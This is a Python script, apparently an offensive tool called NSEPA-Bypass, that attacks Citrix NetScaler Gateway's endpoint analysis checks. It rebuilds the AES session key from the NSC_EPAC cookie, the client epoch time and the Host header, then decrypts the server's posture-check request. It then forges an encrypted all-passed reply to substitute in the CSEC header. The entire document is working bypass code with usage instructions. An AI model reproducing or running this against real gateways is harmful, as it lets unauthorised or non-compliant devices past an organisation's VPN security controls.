import sys
import base64
import hashlib
## Requires pyCrypto --> run 'pip install pycrypto'
from Crypto.Cipher import AES

## Check that theres is enough info
if (len(sys.argv) < 5):
    print("You're not giving me enough to work with here:\n\n");
    print("Usage:\n");
    print("python NSEPA-Bypass.py \"NSC_EPAC Cookie Value\"  \"EPOCH Time from client\"  \"Value of the HOST: Header\" \"Base64 encoded string from Server\"\n\n\n");
    print("Example:\n");
    print("python NSEPA-Bypass.py \"981005eef29ce34c80f535f9e78f4b4d\" \"1498797356\"  \"vpn.example.com\" \"WWoNstbK760pVoPwPzHbs9pEf6Tj/iBk55gnHYwptPohBR0bKsiVVZmDN8J8530G4ISIFkRcC/1IaQSiOr8ouOYC84T5Hzbs2yH3Wq/KToo=\" \n\n\n");
    exit(1);

## Set up the variables.
key = ""
hexcookie=""
cookie = sys.argv[1]
epoch = sys.argv[2]
host =  sys.argv[3]
EPAcrypt64 = sys.argv[4]
EPAcrypt = base64.b64decode(EPAcrypt64)

## Take the cookie string and load it as hex
for i in range(0, len(cookie), 2):
    hexcookie= hexcookie + chr( int(cookie[i:i+2],16))

## Build the key source
keystring = "NSC_EPAC=" + cookie + "\r\n" + epoch + "\r\n" + host + "\r\n" + hexcookie

## Hash the key source
hashedinput = hashlib.sha1(keystring).hexdigest()

## load the hex of the ascii hash
for i in range(0, len(hashedinput), 2):
        key = key + chr( int(hashedinput[i:i+2],16))

## Take the first 16 bytes of the key
key = key[:16]
print "\n"
print "The key for this session is:\n"
print ' '.join(x.encode('hex') for x in key)
print "\n"

## Decryption if encrypted BASE64 Provided
decryption_suite = AES.new(key, AES.MODE_CBC, hexcookie)
decrypted = decryption_suite.decrypt(EPAcrypt).strip()
print "The NetScaler Gateway EPA request: \n\r" + decrypted
print "\n"


## Figure out how many '0's to respond with 
## (semi-colon is the EPA request delimiter)
CSECitems = (decrypted.count(';'))


#Add PKCS5 Padding (string to be encrypted must be a multiple of 16 bytes)
padding=16-(decrypted.count(';'))
response = (chr(48)*CSECitems)+(chr(padding)*padding)

## Encryption
encryption_suite = AES.new(key, AES.MODE_CBC, hexcookie)
print "Replace your current CSEC header with: \nCSEC: " + base64.b64encode(encryption_suite.encrypt(response))
print "\n"
